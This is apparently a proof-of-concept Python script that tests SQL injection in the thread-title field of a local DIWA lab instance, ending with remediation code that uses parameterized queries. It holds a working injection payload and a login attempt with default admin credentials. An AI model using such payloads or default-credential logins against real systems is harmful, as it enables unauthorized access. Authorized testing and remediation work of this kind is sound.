#!/usr/bin/env python3
"""
Stage 2 POC: SQL Injection in Thread Title
Target: http://127.0.0.1:8080 (local DIWA instance only - authorized testing)
Vulnerability: createThread() concatenates title directly into INSERT query
"""

import requests
import sys
import uuid

TARGET = "http://127.0.0.1:8080"
SESSION = requests.Session()

def test_sqli_thread_title():
    """
    Attempt SQL injection via thread title field.
    Payload: ' + (SELECT COUNT(*) FROM users) + ' (information disclosure)
    Expected: SQL error or injection reflected in thread listing
    """
    print("[*] Testing SQL Injection in Thread Title...")
    
    try:
        # Login first (with hardcoded admin account or test account)
        login_payload = {
            'email': 'admin@example.com',
            'password': 'admin'
        }
        resp = SESSION.post(f"{TARGET}/?page=login", data=login_payload)
        
        # If login failed, try creating thread without auth (if allowed)
        resp_check = SESSION.get(f"{TARGET}/?page=newthread")
        
        # Craft SQL injection payload in thread title
        unique_marker = str(uuid.uuid4())[:6]
        payload = {
            'title': f"Thread{unique_marker}' OR '1'='1",  # SQL injection
            'admins_only': '0'
        }
        
        # Submit thread creation
        resp = SESSION.post(f"{TARGET}/?page=newthread", data=payload, allow_redirects=False)
        
        # Check for SQL error
        if 'SQL' in resp.text or 'syntax error' in resp.text.lower():
            print("✅ VULNERABLE: SQL Injection error in thread creation")
            return True
        
        # Check if malicious thread was created and listed
        resp_threads = SESSION.get(f"{TARGET}/?page=board")
        if unique_marker in resp_threads.text and "OR '1'='1" in resp_threads.text:
            print("✅ VULNERABLE: SQL injection payload accepted in thread title")
            return True
        
        # Check for redirect to thread (indicates creation succeeded)
        if 'thread' in resp.headers.get('Location', '').lower():
            print("✅ VULNERABLE: Thread created with injection payload")
            return True
        
        print("❌ NOT REPRODUCIBLE: Injection did not succeed in thread creation")
        return False
        
    except Exception as e:
        print(f"❌ NOT REPRODUCIBLE: Error - {e}")
        return False

if __name__ == '__main__':
    result = test_sqli_thread_title()
    sys.exit(0 if result else 1)

"""
REMEDIATION:
Replace string concatenation with parameterized queries:

  function createThread($pTitle, $pAdminsOnly) {
      try {
          $stmt = $this->db->prepare(
              'INSERT INTO ' . $this->prefix . 'threads (title, admins_only) VALUES (?, ?)'
          );
          $stmt->execute([$pTitle, ($pAdminsOnly ? 1 : 0)]);
          if($stmt->rowCount() > 0) {
              return $this->db->lastInsertId();
          }
          return false;
      }
      catch(Exception $ex) {
          error(500, 'Query could not be executed', $ex);
      }
  }

Key points:
- Use ? placeholder for title parameter
- Pass title in execute() array
- Same pattern for createDownload(), editUser(), editPost(), etc.
- Check rowCount() instead of implicit return value
"""
